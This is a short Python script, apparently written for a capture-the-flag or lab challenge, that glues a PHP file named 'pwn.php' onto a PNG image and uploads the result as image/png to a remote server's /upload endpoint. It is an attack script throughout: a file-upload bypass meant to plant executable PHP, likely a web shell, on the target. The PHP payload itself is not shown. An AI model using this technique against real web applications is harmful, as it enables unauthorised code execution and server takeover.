#!/usr/bin/env python3

# https://stackoverflow.com/questions/39738525/python-requests-how-to-add-content-type-to-multipart-form-data-request

output_file = 'placeholder_pwn.php.png'

lavender = open('placeholder.png','rb').read()
lavender += open('pwn.php','rb').read()
open(output_file,'wb').write(lavender)

import requests

s = requests.Session()

url = 'http://178.62.10.52:32359'

files = {'uploadFile': ("placeholder.png", open(output_file, 'rb'),'image/png')}

response = s.post(url + '/upload', files=files)

print(response.content)

if response.history:
    print("Request was redirected")
    for resp in response.history:
        print(resp.status_code, resp.url)
    print("Final destination:")
    print(response.status_code, response.url)
else:
    print("Request was not redirected")

s.close()

# import base64
# encoded = base64.b64encode(open(output_file, 'rb').read())
# uri = f'data:image/png;base64,{encoded}'